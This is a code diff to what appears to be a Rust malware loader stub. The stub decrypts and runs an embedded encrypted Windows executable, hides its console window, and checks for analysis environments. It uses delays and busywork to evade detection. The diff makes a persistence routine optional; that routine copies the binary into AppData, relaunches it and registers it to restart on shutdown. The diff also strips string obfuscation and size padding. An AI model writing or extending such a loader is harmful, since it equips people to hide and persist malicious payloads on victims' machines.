@@ -1,7 +1,7 @@
 #![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
 mod generated;
 mod persistence;
-use generated::{KEY, NONCE, DELAY_SECS, ANALYSIS_DETECTION};
+use generated::{KEY, NONCE, DELAY_SECS, ANALYSIS_DETECTION , PERSISTENCE};
 use std::error::Error;
 use::std::time::{Duration, Instant};
 use aes_gcm::{
@@ -10,14 +10,10 @@ use aes_gcm::{
 };
 use std::convert::TryInto;
 use busywork::{BusyWork, Categories, Intensity};
-use obfstr::obfstr;
 use rand::RngExt;
 
 // Encrypted + zstd-compressed target PE, embedded at compile time.
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
-
-// Padding bytes for `--add-size`; never read, only referenced by `black_box`.
-static PADDING: &[u8] = include_bytes!("../padding.bin");
 
 fn analysis_detected() -> bool {
     // WARNING: unreliable standalone analysis check. The crate's heuristics
@@ -74,9 +70,6 @@ fn delay_execution() {
 // ... (rest of the imports unchanged) ...
 
 fn run() -> Result<(), Box<dyn Error>> {
-    // Keep PADDING from being stripped by the linker in release builds.
-    std::hint::black_box(&PADDING);
-
     // ---------------------------------------------------------------
     // Persistence bootstrap.
     //
@@ -84,19 +77,22 @@ fn run() -> Result<(), Box<dyn Error>> {
     // under AppData, launches the copy, and exits. On subsequent runs
     // (the copy), it detects that it is already in the target location
     // and registers Phantom Persistence instead of copying again.
-    // ---------------------------------------------------------------
-    if persistence::is_running_from_target() {
-        // We are the copy. Register for restart-on-shutdown.
-        persistence::register_persistence();
-    } else {
-        // First run. Install and launch the copy, then exit.
-        if persistence::install_and_launch().is_ok() {
-            return Ok(());
+    if PERSISTENCE {
+        // ---------------------------------------------------------------
+        if persistence::is_running_from_target() {
+            // We are the copy. Register for restart-on-shutdown.
+            persistence::register_persistence();
+        } else {
+            // First run. Install and launch the copy, then exit.
+            if persistence::install_and_launch().is_ok() {
+                return Ok(());
+            }
+            // If install failed (no APPDATA, permissions, etc.), fall through
+            // and run the payload normally. The stub still works, it just
+            // won't persist.
         }
-        // If install failed (no APPDATA, permissions, etc.), fall through
-        // and run the payload normally. The stub still works, it just
-        // won't persist.
     }
+
 
     // ---------------------------------------------------------------
     // Normal payload flow.
@@ -117,7 +113,7 @@ fn run() -> Result<(), Box<dyn Error>> {
 }
 
 fn main() {
-    if let Err(error) = run() {
+    if let Err(_) = run() {
         std::process::exit(1);
     }
 }
